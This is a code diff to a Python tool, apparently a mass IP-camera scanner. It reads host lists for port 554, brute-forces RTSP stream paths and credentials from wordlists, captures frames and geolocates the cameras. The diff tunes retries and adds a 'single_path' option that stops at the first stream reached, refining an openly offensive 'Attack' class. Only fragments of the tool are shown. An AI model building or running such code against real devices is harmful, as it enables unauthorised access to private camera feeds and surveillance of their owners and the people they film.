@@ -36,11 +36,11 @@ class Target:
         self._iface = iface
 
     def __enter__(self):
-        retries = 5
+        retries = 3
         self.connected = False
         ct = (self.host, int(self.port))
 
-        while retries > 0:
+        while retries:
             try:
                 self._socket = create_connection(ct, 3)
             except:
@@ -121,11 +121,12 @@ class Target:
 
 
 class Attack():
-    def __init__(self, target: Target, paths: list, creds: list):
+    def __init__(self, target: Target, paths: list, creds: list, single_path=False):
         self.fake_path = '/b4db4db4d'
         self._target = target
         self._paths = [self.fake_path] + paths
         self._creds = creds
+        self._single_path = single_path
 
     def __iter__(self):
         target = self._target
@@ -145,6 +146,8 @@ class Attack():
 
             if c == 200:
                 yield url, t
+                if self._single_path:
+                    return
                 continue  # not secured channel
 
             if last_cred:
@@ -169,6 +172,8 @@ class Attack():
                 if ok:
                     last_cred = cred
                     yield url, t
+                    if self._single_path:
+                        return
                     break
 
             # if not last_cred:
@@ -194,17 +199,17 @@ def capture(prefer_ffmpeg, capture_callback, stream_url):
                           img_path, geoip_str_online(up.hostname)])
 
 
-def process_host(paths, creds, iface, host):
+def process_host(paths, creds, iface, single_path, host):
     results = []
     with Target(host, iface) as target:
         if not target:
             return results
-        for url, t in Attack(target, paths, creds):
+        for url, t in Attack(target, paths, creds, single_path):
             results.append((url, t))
     return results
 
 
-def main(H=None, P=None, C=None, ff=False, cc='', ht=None, i=None, c=False):
+def main(H=None, P=None, C=None, ff=False, cc='', ht=None, i=None, c=False, sp=False):
     with open(P or os.path.join(DATA_DIR, 'rtsp_paths4.txt')) as f:
         paths = [ln.rstrip() for ln in f]
 
@@ -212,7 +217,7 @@ def main(H=None, P=None, C=None, ff=False, cc='', ht=None, i=None, c=False):
         creds = [ln.rstrip() for ln in f]
 
     cams = []
-    ph = partial(process_host, paths, creds, i)
+    ph = partial(process_host, paths, creds, i, sp)
 
     with open(H or os.path.join(LOCAL_DIR, 'hosts_554.txt')) as f:
         total = sum(1 for _ in f)
